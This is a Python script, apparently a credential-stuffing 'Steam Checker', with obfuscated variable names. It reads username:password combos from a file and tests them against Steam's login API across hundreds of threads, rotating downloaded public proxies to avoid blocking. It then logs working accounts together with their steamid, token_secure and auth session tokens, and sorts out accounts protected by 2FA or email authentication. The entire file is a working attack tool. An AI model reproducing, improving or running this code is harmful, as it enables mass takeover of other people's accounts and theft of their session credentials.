import datetime
import json
import os
import urllib.request
from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor
from random import choice



from crypto.Cipher import PKCS1_v1_5
from crypto.PublicKey import RSA
from art import tprint
from loguru import logger
from requests import post
import pretty_errors

_1_1_1__ = 0
_1_1_11__ = 0
_1_1_111__ = 0
_1_11_11__ = 0
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
clear()
tprint('Steam Checker\n')
print('by httpshotmaker')
_1_1____1 = datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
url = 'https://github.com/jetkai/proxy-list/raw/main/online-proxies/txt/proxies-https.txt'
urllib.request.urlretrieve(url, 'http.txt')
logger.success('Прокси успешно обновлены')
try:
    proxy = open("http.txt", encoding='utf-8').readlines()
except:
    logger.critical('Файл http.txt отсутствует')
    input()
    exit()


def __1_1_1_1(_1_, _11_):
    global _1_1_1__
    global _1_1_11__
    global _1_1_111__
    global _1_11_11__
    _1_1___ = post("https://steamcommunity.com/login/getrsakey/", data={"username": _1_})
    ___1___ = _11_
    __1__ = int(json.loads(_1_1___.text)["publickey_mod"], 16)
    __1___ = int(json.loads(_1_1___.text)["publickey_exp"], 16)
    ThreadPoolExecutor = RSA.construct((__1__, __1___))
    _1__ = PKCS1_v1_5.new(ThreadPoolExecutor)
    __1_ = _1__.encrypt(bytes(___1___, 'utf-8'))
    __1__ = b64encode(__1_)
    _1__1 = str(__1__).split("'")
    while True:
        try:
            _ = post("https://steamcommunity.com/login/dologin/", data={"username": _1_, "password": _1__1[1],
                                                                        "rsatimestamp": json.loads(_1_1___.text)[
                                                                            "timestamp"]},
                     proxies={"https": f"http://{choice(proxy)}"})
            __11__1 = json.loads(_.text)
            # print(__11__1)
            if __11__1["success"]:
                __0 = open(f"./results/{_1_1____1}/#work.txt", "a+")
                __0.write(
                    "{_1_}:{_11_} (STEAMID: {_111__1__}, TOKEN_SECURE: {_111__11__}, AUTH: {_111__111__})\n".format(
                        _1_=_1_, _11_=_11_, _111__1__=__11__1["transfer_parameters"]["steamid"],
                        _111__11__=__11__1["transfer_parameters"]["token_secure"],
                        _111__111__=__11__1["transfer_parameters"]["auth"]))
                __0.close()
                logger.success(f'{_1_}:{_11_}')
                with open(f"./results/{_1_1____1}/#userpass.txt", "a+") as file:
                    file.write(f'{_1_}:{_11_}\n')
                _1_1_11__ += 1

                break
            elif __11__1["message"] == "The account name or password that you have entered is incorrect.":
                __0 = open(f"./results/{_1_1____1}/#bad.txt", "a+")
                __0.write(f"{_1_}:{_11_}\n")
                __0.close()
                logger.error(f'BAD | {_1_}:{_11_}')
                _1_1_1__ += 1

                break
            elif __11__1["requires_twofactor"]:
                __0 = open(f"./results/{_1_1____1}/#2fa.txt", "a+")
                __0.write(f"{_1_}:{_11_}\n")
                __0.close()
                logger.error(f'2FA | {_1_}:{_11_}')
                _1_1_111__ += 1

                break
            elif __11__1["emailauth_needed"]:
                __0 = open(f"./results/{_1_1____1}/#mfa.txt", "a+")
                __0.write(f"{_1_}:{_11_}\n")
                __0.close()
                logger.error(f'MFA | {_1_}:{_11_}')
                _1_11_11__ += 1
                break
            else:
                continue
        except Exception as e:
            continue


if __name__ == "__main__":
    __1 = input("Thread (recommend 100 - 500): ")
    ___ = ThreadPoolExecutor(max_workers=int(__1))
    try:
        ___1 = open("combos.txt", "r+")
    except:
        logger.critical("Файл combos.txt не найден")
        input()
        exit()
    ____1 = ___1.read().split("\n")
    for _ in ____1:
        ___.submit(__1_1_1_1, _.split(":")[0], _.split(":")[1])
    os.makedirs(f"./results/{_1_1____1}")
    clear()
    tprint('Steam Checker\n')
    print('by httpshotmaker')